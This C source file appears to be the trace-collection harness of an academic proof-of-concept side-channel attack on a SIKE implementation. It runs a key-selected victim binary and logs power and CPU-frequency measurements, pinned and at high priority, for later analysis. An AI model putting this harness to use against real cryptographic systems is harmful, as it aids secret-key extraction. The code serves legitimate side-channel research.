#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sched.h>
#include <inttypes.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <signal.h>
#include <time.h>
#include <math.h>
#include <sys/resource.h>
#include <pthread.h>
#include <string.h>
#include "../../util/util.h"

volatile static int attacker_core_ID;

#define TIME_BETWEEN_MEASUREMENTS 1000000L // 1 millisecond

struct args_t {
	uint64_t iters;
	int flipkey;
	int keyindex;
	int bitindex;
	int number_thread;
};

// Adds necessary background system load
static void victim(void *command)
{
	system((char *)command);
}

// Collects traces
static __attribute__((noinline)) int monitor(void *in)
{
	static int rept_index = 0;

	struct args_t *arg = (struct args_t *)in;

	// Pin monitor to a single CPU
	pin_to_core(attacker_core_ID);
    int mb = mbox_open();
    
	// Set filename
	// The format is, e.g., ./out/all_02_2330.out
	// where 02 is the selector and 2330 is an index to prevent overwriting files
	char output_filename[64];
	sprintf(output_filename, "./out/all_%01d_%02d_%03d_%05d_%06d.out", arg->flipkey, arg->keyindex, arg->bitindex, arg->number_thread, rept_index);
	rept_index += 1;

	// Prepare output file
	FILE *output_file = fopen((char *)output_filename, "w");
	if (output_file == NULL) {
		perror("output file");
	}

	// Prepare
    uint64_t start_cc = read_pmccntr_el0();
    uint64_t start_vc = read_cntvct_el0();
    uint64_t prev_cc = start_cc;
    uint64_t prev_vc = start_vc;
    uint64_t cntfrq = read_cntfrq_el0();
	double energy, hz;
    double time = 0;
    struct timespec ts = {0, TIME_BETWEEN_MEASUREMENTS};

    // Collect measurements
    for (uint64_t i = 0; i < arg->iters; i++) {
        // Wait before next measurement
        nanosleep(&ts, NULL);
        // Collect measurement
		start_cc = read_pmccntr_el0();
		start_vc = read_cntvct_el0();

        // Adds about 0.014 seconds
		energy = read_power(mb); // Adds around 0.00374 seconds on average
        //hz = read_hz(mb); // Adds 0.011 seconds
		uint64_t delta_cc = start_cc - prev_cc;
		uint64_t delta_vc = start_vc - prev_vc;
        time += (double)(delta_vc)/(double) cntfrq;

		/* frequency (Hz) = (delta_cc / delta_vc) * cntfrq */
		hz = ((double)delta_cc / (double)delta_vc) * (double)cntfrq;

        fprintf(output_file, "%.15f %.15f %.15f\n", energy, hz, time);
	
		// Save current
		prev_cc = start_cc;
		prev_vc = start_vc;
	}

	// Clean up
	fclose(output_file);
	return 0;
}

int main(int argc, char *argv[])
{
	// Check arguments
	if (argc != 3) {
		fprintf(stderr, "Wrong Input! Enter: %s <samples> <outer>\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	// Read in args
	struct args_t arg;
	int outer;
	sscanf(argv[1], "%" PRIu64, &(arg.iters));
	sscanf(argv[2], "%d", &outer);
	if (outer < 0) {
		fprintf(stderr, "outer cannot be negative!\n");
		exit(1);
	}

	// Open the selector file
	FILE *selectors_file = fopen("input.txt", "r");
	if (selectors_file == NULL)
		perror("fopen error");

	// Read the selectors file line by line
	int num_selectors = 0;
	int flipkey[100];
	int keyindex[100];
	int bitindex[100];
	int number_thread[100];
	size_t len = 0;
	ssize_t read = 0;
	char *line = NULL;
	while ((read = getline(&line, &len, selectors_file)) != -1) {
		if (line[read - 1] == '\n')
			line[--read] = '\0';

		// Read selector
		sscanf(line, "%d %d %d %d", &(flipkey[num_selectors]), &(keyindex[num_selectors]), &(bitindex[num_selectors]), &(number_thread[num_selectors]));
		num_selectors += 1;
	}

	// Set the scheduling priority to high to avoid interruptions
	// (lower priorities cause more favorable scheduling, and -20 is the max)
	setpriority(PRIO_PROCESS, 0, -20);

	// Prepare up monitor/attacker
	attacker_core_ID = 0;

	// Run experiment once for each selector
	for (int i = 0; i < outer * num_selectors; i++) {

		// Set alternating selector
		arg.flipkey = flipkey[i % num_selectors];
		arg.keyindex = keyindex[i % num_selectors];
		arg.bitindex = bitindex[i % num_selectors];
		arg.number_thread = number_thread[i % num_selectors];
        
        warmup();
        
		// Prepare for experiments
		pthread_t thread1, thread2;

		// Prepare background stress command
		char command[256];
		sprintf(command, "../circl/dh/sidh/POC_ATTACK/sike_local %d %d %d %d 1000000000", arg.flipkey, arg.keyindex, arg.bitindex, arg.number_thread);
		printf("Running: %s\n", command);

		// Start LOCAL
		pthread_create(&thread1, NULL, (void *)&victim, (void *)command);

		// Wait 35 seconds before starting the monitor
		sleep(35);

		// Start monitor
		pthread_create(&thread2, NULL, (void *)&monitor, (void *)&arg);

		// Wait for monitor to be done
		pthread_join(thread2, NULL);

		// Stop stress
		system("pkill -f sike_local");

		// Join stress
		pthread_join(thread1, NULL);
	}
}
